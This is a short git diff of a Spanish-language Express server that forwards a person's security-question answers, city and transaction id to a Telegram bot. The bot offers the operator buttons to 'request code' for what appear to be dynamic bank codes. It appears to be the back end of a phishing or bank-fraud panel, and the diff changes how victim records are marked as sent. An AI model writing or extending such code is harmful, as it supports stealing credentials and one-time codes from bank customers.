@@ -7,6 +7,7 @@ require('dotenv').config();
 const app = express();
 app.use(cors());
 
+// CORS manual
 app.use((req, res, next) => {
   res.header('Access-Control-Allow-Origin', '*');
   res.header('Access-Control-Allow-Headers', 'Origin, X-Requested-With, Content-Type, Accept');
@@ -114,6 +115,12 @@ ${pregunta2}❓ : ${respuesta2}
 🏙️ Ciudad: ${ciudad}
 `;
 
+  // ✅ Actualizar el estado a "enviado"
+  if (clientes[txid]) {
+    clientes[txid].status = "enviado";
+    guardarEstado();
+  }
+
   const keyboard = {
     inline_keyboard: [
       [{ text: "🔑PEDIR CÓDIGO", callback_data: `cel-dina:${txid}` }],
@@ -136,6 +143,7 @@ ${pregunta2}❓ : ${respuesta2}
 
   res.sendStatus(200);
 });
+
 
 app.post('/webhook', async (req, res) => {
   if (req.body.callback_query) {
@@ -212,8 +220,6 @@ app.post('/webhook', async (req, res) => {
       cliente.preguntas[1] = text;
       cliente.esperando = null;
       cliente.status = 'preguntas';
-      clientes[txid] = cliente; // 🔧 asegurar que se actualiza correctamente
-      guardarEstado();
 
       await fetch(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
         method: 'POST',
@@ -223,8 +229,6 @@ app.post('/webhook', async (req, res) => {
           text: `✅ Segunda pregunta guardada.\n\nPreguntas para ${txid}:\n1️⃣ ${cliente.preguntas[0]}\n2️⃣ ${cliente.preguntas[1]}`
         })
       });
-
-      return res.sendStatus(200);
     }
 
     guardarEstado();
